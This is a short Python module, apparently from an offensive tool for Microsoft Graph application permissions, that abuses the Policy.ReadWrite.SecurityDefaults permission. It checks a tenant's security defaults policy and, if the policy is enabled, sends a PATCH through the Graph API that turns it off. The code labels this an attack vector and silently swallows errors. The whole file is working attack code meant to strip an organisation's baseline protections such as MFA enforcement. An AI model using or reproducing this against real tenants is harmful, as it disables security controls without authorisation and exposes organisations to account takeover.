import requests
import colorama
from colorama import Fore, Style


def SecDefaults_Vectors(request_headers):
    print()
    print("Policy.ReadWrite.SecurityDefaults - Allows the app to read and write your organization's security defaults "
          "policy, without a signed-in user.")
    print()
    try:
        print("Attack vector - security settings shut down.")

        create_message_URL = "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy"

        result = requests.get(create_message_URL, headers=request_headers)
        json = result.json()
        if not json["isEnabled"]:
            print(Fore.GREEN + "Security Defaults is disabled.")
            print(Style.RESET_ALL)

        else:
            create_message_URL = "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy"
            message_obj = {
                "isEnabled": False
            }
            result = requests.patch(create_message_URL, json=message_obj, headers=request_headers)
            json = result.json()
            if not json["isEnabled"]:
                print(Fore.GREEN + "Security Defaults is disabled.")
                print(Style.RESET_ALL)
            else:
                print(Fore.RED + "Security Defaults status is unknown. Probably still active.")
                print(Style.RESET_ALL)


    except:
        pass
